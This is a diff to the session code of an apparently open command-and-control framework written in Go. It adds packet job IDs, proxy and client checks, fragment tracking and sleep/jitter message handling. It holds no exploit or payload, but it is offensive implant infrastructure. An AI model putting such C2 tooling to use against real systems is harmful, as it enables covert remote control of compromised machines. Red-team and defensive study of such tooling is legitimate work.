@@ -3,15 +3,21 @@ package c2
 import (
 	"bytes"
 	"context"
+	"errors"
 	"math"
 	"math/rand"
 	"time"
 
 	"github.com/iDigitalFlame/xmt/xmt/com"
 	"github.com/iDigitalFlame/xmt/xmt/device"
+	"github.com/iDigitalFlame/xmt/xmt/util"
 )
 
 var (
+	// ErrFullBuffer is returned from the WritePacket function when the send buffer for
+	// Session is full.
+	ErrFullBuffer = errors.New("cannot add a Packet to a full send buffer")
+
 	jitterMin int8
 	jitterMax int8 = 100
 )
@@ -21,6 +27,7 @@ var (
 // communication channel between the client and server.
 type Session struct {
 	ID       device.ID
+	Mux      Mux
 	Last     time.Time
 	Sleep    time.Duration
 	Jitter   int8
@@ -36,6 +43,7 @@ type Session struct {
 	send       chan *com.Packet
 	recv       chan *com.Packet
 	wake       chan bool
+	frags      map[uint16]*com.Packet
 	errors     int8
 	server     string
 	cancel     context.CancelFunc
@@ -150,7 +158,7 @@ func (s *Session) listen() {
 // shutdown and release resources. This will not close the session until
 // the client acknowledges and sends the response to this packet.
 func (s *Session) Shutdown() {
-	s.WritePacket(&com.Packet{ID: PacketShutdown, Device: s.Device.ID})
+	s.WritePacket(&com.Packet{ID: MsgShutdown, Device: s.Device.ID, Job: 1})
 }
 
 // Close stops the listening thread from this Session and
@@ -173,10 +181,26 @@ func (s *Session) Close() error {
 	return nil
 }
 
+// IsProxy returns true when a Proxy has been attached to this Session and is active.
+func (s *Session) IsProxy() bool {
+	return s.proxies != nil && len(s.proxies) > 0
+}
+
+// String returns the ID of this Session.
+func (s *Session) String() string {
+	return s.ID.FullString()
+}
+
 // IsActive returns true if this Session is
 // still able to send and receive Packets.
 func (s *Session) IsActive() bool {
 	return s.ctx.Err() == nil
+}
+
+// IsClient returns true when this Session is not associated to
+// a Handle on this end, which signifies that this session is Client initiated.
+func (s *Session) IsClient() bool {
+	return s.parent == nil
 }
 
 // Times sets the wake/sleep values in the form of
@@ -231,11 +255,14 @@ func (s *Session) WritePacket(p *com.Packet) error {
 }
 func next(c chan *com.Packet, i device.ID) (*com.Packet, error) {
 	if len(c) == 0 {
-		return &com.Packet{ID: PacketSleep, Device: i}, nil
+		return &com.Packet{ID: MsgSleep, Device: i}, nil
 	}
 	var p *com.Packet
 	if len(c) == 1 {
 		p = <-c
+		if p.Job == 0 {
+			p.Job = uint16(util.Rand.Uint32())
+		}
 		if p.Device == nil {
 			p.Device = i
 			return p, nil
@@ -243,7 +270,7 @@ func next(c chan *com.Packet, i device.ID) (*com.Packet, error) {
 			return p, nil
 		}
 	}
-	m := &com.Packet{ID: PacketMultiple, Device: i}
+	m := &com.Packet{ID: MsgMultiple, Device: i}
 	var t int
 	var x, a bool
 	if p != nil {
@@ -256,6 +283,9 @@ func next(c chan *com.Packet, i device.ID) (*com.Packet, error) {
 	}
 	for ; len(c) > 0 && t < com.MaxAutoMultiSize; t++ {
 		p = <-c
+		if p.Job == 0 {
+			p.Job = uint16(util.Rand.Uint32())
+		}
 		if p.Device == nil {
 			a = true
 			p.Device = i
@@ -272,15 +302,15 @@ func next(c chan *com.Packet, i device.ID) (*com.Packet, error) {
 	if !a {
 		t++
 		x = true
-		p = &com.Packet{ID: PacketSleep, Device: i}
+		p = &com.Packet{ID: MsgSleep, Device: i}
 		if err := p.MarshalStream(m); err != nil {
 			return nil, err
 		}
 	}
 	m.Close()
-	m.Flags.Add(com.FlagMulti)
+	m.Flags |= com.FlagMulti
 	if x {
-		m.Flags.Add(com.FlagMultiDevice)
+		m.Flags |= com.FlagMultiDevice
 	}
 	m.Flags.SetFragTotal(uint16(t))
 	return m, nil
